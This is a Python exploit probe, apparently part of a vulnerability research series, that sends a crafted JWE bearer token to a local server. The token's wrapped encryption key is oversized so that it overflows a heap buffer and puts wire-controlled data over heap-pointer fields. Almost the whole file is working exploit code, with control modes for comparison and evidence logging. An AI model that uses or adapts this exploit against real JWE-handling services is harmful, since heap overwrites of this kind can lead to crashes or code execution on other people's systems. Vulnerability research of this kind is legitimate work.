#!/usr/bin/env python3
"""W219b: vary the chosen-write length in the A128GCM bearer lane.

W219's 144-byte write stopped immediately before two heap-pointer-shaped
values at cek+0x90. This probe pushes the write to 168 bytes so those fields
are wire-controlled, with a zero-far control and short/no-overflow controls.
"""
import json
import os
import socket
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from probe import b64u, wrap

HOST = "127.0.0.1"
PORT = int(os.environ.get("W2_PORT", "18444"))
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
TAG = os.environ.get("W2_TAG", "w219b")
ENC = os.environ.get("W2_ENC", "A128GCM")
KEK = bytes.fromhex(os.environ.get("W2_KEK", "30313233343536373839616263646566"))

mode = sys.argv[1]
if mode == "safe":
    ek_len = 24
elif mode == "base":
    ek_len = 152
else:
    ek_len = 176
plain = bytearray(ek_len - 8)
plain[0:16] = b"MISHE-W219B-ENC-"
for off in range(16, len(plain), 8):
    plain[off:off + 8] = b"AAAAAAAA"
if mode == "zero":
    for off in range(0x90, len(plain), 8):
        plain[off:off + 8] = b"\x00" * 8

header = {"alg": "A128KW", "enc": ENC}
h = b64u(json.dumps(header, separators=(",", ":")).encode())
ek = wrap(bytes(plain), KEK)
tok = ".".join((h, b64u(ek), b64u(os.urandom(16)),
                b64u(b"\x11" * 48), b64u(b"\x22" * 32)))

req = (
    b"GET /private HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"User-Agent: w2-w219b-probe\r\n"
    b"Authorization: Bearer " + tok.encode("ascii") + b"\r\n"
    b"Connection: close\r\n\r\n"
)
os.makedirs(EVIDENCE, exist_ok=True)
with open(os.path.join(EVIDENCE, "%s-request.bin" % TAG), "wb") as f:
    f.write(req)
with open(os.path.join(EVIDENCE, "%s-token.txt" % TAG), "w") as f:
    f.write(tok + "\n")
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.sendall(req)
    chunks = []
    while True:
        data = s.recv(4096)
        if not data:
            break
        chunks.append(data)
resp = b"".join(chunks)
with open(os.path.join(EVIDENCE, "%s-response.bin" % TAG), "wb") as f:
    f.write(resp)
print("W219B_MODE=%s ENC=%s EK_RAW_LEN=%d RESPONSE=%r" %
      (mode, ENC, len(ek), resp[:120]))
